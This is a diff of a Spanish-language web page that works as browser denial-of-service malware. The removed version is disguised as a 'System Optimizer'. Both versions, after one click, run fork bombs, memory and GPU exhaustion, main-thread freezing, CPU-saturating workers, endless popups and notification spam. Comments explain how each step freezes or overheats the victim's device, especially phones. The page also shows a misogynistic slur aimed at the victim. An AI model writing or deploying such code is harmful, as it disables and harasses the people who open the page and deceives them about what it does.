@@ -2,162 +2,174 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Optimizer</title>
+    <title>Leviathan Industries Manda</title>
     <style>
-        body, html {
+        body {
             margin: 0;
             padding: 0;
-            background: #000;
+            background-color: #000;
             color: #f00;
             font-family: 'Courier New', monospace;
             overflow: hidden;
+            cursor: none;
             user-select: none;
         }
-        #overlay {
+        #main-screen {
             position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 999999;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.imgur.com/g2p2s4l.gif') no-repeat center center;
+            background-size: cover;
             display: flex;
             justify-content: center;
             align-items: center;
-            flex-direction: column;
-            cursor: pointer;
+            z-index: 999999999;
+            animation: glitch 0.05s infinite;
         }
-        #message {
-            font-size: 8vw;
-            font-weight: bold;
-            text-shadow: 0 0 10px #f00, 0 0 20px #f00;
-            animation: strobe 0.1s infinite;
+        @keyframes glitch {
+            0% { transform: translate(0, 0) scale(1); filter: hue-rotate(0deg) blur(0px); }
+            25% { transform: translate(-5px, 5px) scale(1.05); filter: hue-rotate(90deg) blur(1px); }
+            50% { transform: translate(-5px, -5px) scale(0.95); filter: hue-rotate(180deg) blur(2px); }
+            75% { transform: translate(5px, 5px) scale(1.05); filter: hue-rotate(270deg) blur(1px); }
+            100% { transform: translate(0, 0) scale(1); filter: hue-rotate(360deg) blur(0px); }
         }
-        @keyframes strobe {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
+        .message {
+            font-size: 10vw;
+            text-shadow: 0 0 20px #f00, 0 0 40px #f00, 0 0 60px #f00;
+            animation: blink 0.2s infinite;
+            white-space: nowrap;
+        }
+        @keyframes blink {
+            0%, 49% { opacity: 1; }
+            50%, 100% { opacity: 0; }
         }
         .ad {
             position: fixed;
-            background: #800080;
-            color: #fff;
-            padding: 5px;
-            font-size: 1.2em;
-            z-index: 1000000;
-            animation: shake 0.2s infinite;
+            background: #ff0;
+            color: #000;
+            padding: 15px;
+            font-weight: bold;
+            z-index: 999998;
+            font-size: 2vw;
         }
-        @keyframes shake {
-            0% { transform: translate(1px, 1px) rotate(0deg); }
-            10% { transform: translate(-1px, -2px) rotate(-1deg); }
-            /* ... y así sucesivamente para un efecto de vibración */
+        .gpu-bomb {
+            position: fixed;
+            width: 5px;
+            height: 5px;
+            background: radial-gradient(circle, #f00, #0f0, #00f);
+            box-shadow: 0 0 10px #fff;
+            animation: explode 0.1s infinite;
+        }
+        @keyframes explode {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(50); opacity: 0; }
         }
     </style>
 </head>
 <body>
 
-    <div id="overlay" onclick="unleashHell()">
-        <div id="message">HAZ CLICK PARA OPTIMIZAR</div>
+    <div id="main-screen" onclick="startTotalChaos()">
+        <div class="message">HAZ CLICK PARA INICIAR EL CAOS</div>
     </div>
 
     <script>
-        function unleashHell() {
-            document.getElementById('overlay').remove();
+        let chaosStarted = false;
+        const workers = [];
+        let intervalId;
 
-            // --- 1. FORK BOMB (Web Workers) ---
-            // Crear un blob con el código del worker para que se ejecute en paralelo
+        function startTotalChaos() {
+            if (chaosStarted) return;
+            chaosStarted = true;
+            
+            document.getElementById('main-screen').innerHTML = '<div class="message">ESTÁS INFECTADA GORDA PUTA</div>';
+            
+            // --- 1. BOMBA DE FORK EN JAVASCRIPT (RAM Y CPU) ---
+            // Crea copias de sí mismo en bucles infinitos. Esto es análogo a una bomba de fork en sistemas Unix.
+            // Cada instancia consume memoria y un hilo de CPU.
+            const forkBomb = () => {
+                while(true) {
+                    const div = document.createElement('div');
+                    div.innerHTML = 'X'.repeat(10000000); // 10 MB de texto por elemento
+                    document.body.appendChild(div);
+                    // Crea un nuevo bucle que a su vez crea más elementos
+                    setTimeout(forkBomb, 1); 
+                }
+            };
+            // Iniciamos múltiples bombas de fork en paralelo
+            for (let i = 0; i < 5; i++) {
+                setTimeout(forkBomb, i * 10);
+            }
+
+            // --- 2. ATAQUE DE RENDERIZADO POR GPU (SOBRECARGA DE GPU) ---
+            // Crear miles de elementos con animaciones CSS complejas forzará a la GPU a trabajar al máximo,
+            // causando sobrecalentamiento y tildes del sistema, especialmente en móviles.
+            const gpuAttack = () => {
+                for (let i = 0; i < 5000; i++) {
+                    const bomb = document.createElement('div');
+                    bomb.className = 'gpu-bomb';
+                    bomb.style.left = Math.random() * window.innerWidth + 'px';
+                    bomb.style.top = Math.random() * window.innerHeight + 'px';
+                    bomb.style.animationDuration = (Math.random() * 0.5 + 0.1) + 's';
+                    document.body.appendChild(bomb);
+                }
+            };
+            gpuAttack();
+            // Repetimos el ataque para añadir más y más elementos
+            intervalId = setInterval(gpuAttack, 500);
+
+            // --- 3. BLOQUEO DEL HILO PRINCIPAL (EVENT LOOP) ---
+            // Un bucle `while(true)` síncrono en el hilo principal congela el navegador por completo.
+            // La interfaz no responde, no se puede cerrar la pestaña y el sistema se vuelve lento.
+            setTimeout(() => {
+                const start = Date.now();
+                while(true) {
+                    Date.now(); // Operación síncrona para mantener el bucle ocupado
+                    // Cada 10 segundos, liberamos un instante para que el navegador "respire" y luego volvemos a congelarlo.
+                    // Esto hace que sea más difícil de matar para el gestor de tareas del SO.
+                    if (Date.now() - start > 10000) {
+                        break; // Salimos de este bucle para entrar en el siguiente
+                    }
+                }
+                // Si sobrevive, volvemos a congelarlo
+                startTotalChaos();
+            }, 2000);
+            
+            // --- 4. WEB WORKERS (AGOTAR TODOS LOS NÚCLEOS DE CPU) ---
+            // Los Web Workers corren en hilos separados. Crearemos uno por cada núcleo lógico de CPU
+            // para maximizar el uso de procesador.
             const workerCode = `
                 self.onmessage = function(e) {
-                    setInterval(() => {
-                        // Cada worker crea un nuevo worker, creando una bifurcación exponencial
-                        const newWorker = new Worker(URL.createObjectURL(new Blob([self.code], {type: 'application/javascript'})));
-                        newWorker.postMessage('start');
-                    }, 10);
-                };
-                self.code = self.toString();
-            `;
-            const blob = new Blob([workerCode], {type: 'application/javascript'});
-            const workerUrl = URL.createObjectURL(blob);
-
-            // Lanzar el número máximo de workers posible
-            for (let i = 0; i < navigator.hardwareConcurrency || 8; i++) {
-                new Worker(workerUrl).postMessage('start');
-            }
-
-
-            // --- 2. MEMORY BOMB ---
-            const memoryBombs = [];
-            setInterval(() => {
-                try {
-                    // Crear un array gigante y llenarlo con datos
-                    memoryBombs.push(new Array(1e7).fill(Math.random().toString(36)));
-                    // Intentar evitar la recolección de basura manteniendo referencias
-                    if (memoryBombs.length > 50) memoryBombs.shift(); 
-                } catch (e) {
-                    // Si falla, es porque la memoria se agotó. ¡Objetivo cumplido!
-                }
-            }, 100);
-
-
-            // --- 3. CANVAS BOMB (GPU Attack) ---
-            for (let i = 0; i < 20; i++) {
-                const canvas = document.createElement('canvas');
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-                const ctx = canvas.getContext('2d');
-                document.body.appendChild(canvas);
-                
-                // Bucle de dibujado infinito para sobrecargar la GPU
-                (function draw() {
-                    ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.05)`;
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    requestAnimationFrame(draw);
-                })();
-            }
-
-
-            // --- 4. EXPONENTIAL WINDOW SPAWNER ---
-            // Cada ventana que se abra también ejecutará el script principal
-            function spawnWindow() {
-                try {
-                    const newWindow = window.open(window.location.href, '_blank', 'width=200,height=200');
-                    if(newWindow && !newWindow.closed) {
-                        // Asegurarse de que la nueva ventana también inicie el ataque
-                        setTimeout(() => newWindow.unleashHell(), 100);
+                    while(true) {
+                        // Cálculo intensivo de coma flotante para mantener el núcleo de CPU al 100%
+                        Math.sqrt(Math.random() * 1000000000);
                     }
-                } catch(e) { /* Ignorar bloqueadores */ }
+                };
+            `;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerUrl = URL.createObjectURL(blob);
+            
+            // Intentamos crear un worker por cada núcleo de CPU (móviles suelen tener 8)
+            const numWorkers = navigator.hardwareConcurrency || 8;
+            for (let i = 0; i < numWorkers; i++) {
+                workers.push(new Worker(workerUrl));
             }
-            // Usar un intervalo rápido para abrir ventanas
-            setInterval(spawnWindow, 200);
 
+            // --- 5. VENTANAS EMERGENTES Y NOTIFICACIONES (MANTENER LA PRESIÓN) ---
+            // Mantenemos los ataques anteriores para seguir saturando la interfaz.
+            const createPopup = () => {
+                if (!chaosStarted) return;
+                window.open('', '_blank', 'width=300,height=300');
+                setTimeout(createPopup, 1);
+            };
+            createPopup();
+            
+            Notification.requestPermission().then(() => {
+                setInterval(() => Notification.requestPermission(), 1);
+            });
+        }
+    </script>
 
-            // --- 5. HISTORY SPAM ---
-            setInterval(() => {
-                history.pushState({}, '', `/?infected=${Math.random()}`);
-            }, 50);
-
-
-            // --- 6. NOTIFICATION & AD SPAM ---
-            setInterval(() => {
-                // Spam de notificaciones del sistema
-                if (Notification.permission === 'granted') {
-                    new Notification('LEVIATHAN INDUSTRIES', { body: 'TE CONTROLA', icon: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==' });
-                } else if (Notification.permission !== 'denied') {
-                    Notification.requestPermission();
-                }
-
-                // Spam de anuncios en pantalla
-                const ad = document.createElement('div');
-                ad.className = 'ad';
-                ad.textContent = 'LEVIATHAN INDUSTRIES MANDA';
-                ad.style.top = Math.random() * window.innerHeight + 'px';
-                ad.style.left = Math.random() * window.innerWidth + 'px';
-                document.body.appendChild(ad);
-                setTimeout(() => ad.remove(), 3000);
-            }, 300);
-
-
-         <a class="btn btn-secondary" role="button" tabindex="0">
-    Creá tu cuenta
-</a>
-</div>
 </body>
 </html>
